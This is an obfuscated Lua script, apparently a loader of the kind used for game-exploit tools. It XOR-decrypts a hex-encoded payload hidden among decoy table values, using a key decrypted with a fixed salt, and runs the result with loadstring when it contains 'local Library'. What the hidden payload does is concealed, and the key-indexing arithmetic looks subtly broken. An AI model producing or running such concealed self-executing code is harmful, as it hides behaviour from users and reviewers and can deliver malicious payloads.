--[[ Protected by Advanced Lua Obfuscator v3.0 ]]
(function() 
    local t = {605440, "LvHNbuwFqlqZp", 259091, "0a080b08064b20040c1d11030b5349551a18191d0935302a2a226e2029242f7104393a3f1734267b763d2223282a601f1e4052437f353a203d23352d2a3f42525d38233d372e1e525d5e492f0d11221e0e35412211181c5c0610100457111f2026306b28272e266606222e1b7c613c2433717d7c7e7e5235585b5834790d595f565c43150b177450433242565c64714346212930606b022e34053b2d086b7205657b66796879601076405c431557177f5853240309485b48426601010c111d523e151c185745592d282c272b327c13292b62690422232a727858", true, "fAZDuZaatJkX", 650182, 591093, "_SQPJjFhynxR", "SifMIMnBW^ZlJy", 383600, 868158, false, "XO`WB]iQFAzlNIxAKU", 607022, "bZDzRmh[eEiK\\jg", "mKz^X", "XSpvvuc]Ug\\g", 155986, "NoNj_", false, 669497, "K[gfrz[nuVWXk", "W\\C]`QQnzohsTUvr_V_", "^fAYAWpk", 712341}
    local v = { [1] = 4 }
    local k = "202e302c2e343f2c223b2f43424142333f2f3d3d2512030f101a74777a7f0c0214080a1003101e070b6766656e1f136874766c67101e070b6766656e1f13687476090419150e6f030201502121312f2f333e2f23242e40434643303e203c3e1e110208111975787b7c0d05150b0b0f02131f000a64676a6f7171611d1d0563707e676b0706050e7f681866607a0d67667c1a74777a7f0c0214080a1003101e070b6766656e1f136874766c67747a63670b1172"
    local function xorBytes(a, b)
        local result = 0
        local bit = 1
        while a > 0 or b > 0 do
            local a_bit = a % 2
            local b_bit = b % 2
            if a_bit ~= b_bit then
                result = result + bit
            end
            a = math.floor(a / 2)
            b = math.floor(b / 2)
            bit = bit * 2
        end
        return result
    end
    
    local function xorDecrypt(str, key)
        local out = ''
        for i = 1, #str, 2 do
            local hex = string.sub(str, i, i+1)
            local num = tonumber(hex, 16)
            local keyChar = string.byte(key, ((i/2) - 1) % #key + 1)
            local xorResult = xorBytes(num, keyChar)
            out = out .. string.char(xorResult)
        end
        return out
    end
    
    local function findPayload(data)
        for _, item in pairs(data) do
            if type(item) == 'string' and item:match('^%x+$') then
                local decrypted = xorDecrypt(item, xorDecrypt(k, 'FIXED_SALT_2026'))
                if decrypted and decrypted:find('local Library') then
                    return decrypted
                end
            end
        end
        return nil
    end
    
    local payload = findPayload(t)
    if payload then
        local func = loadstring(payload)
        if func then
            func()
        end
    end
end)()
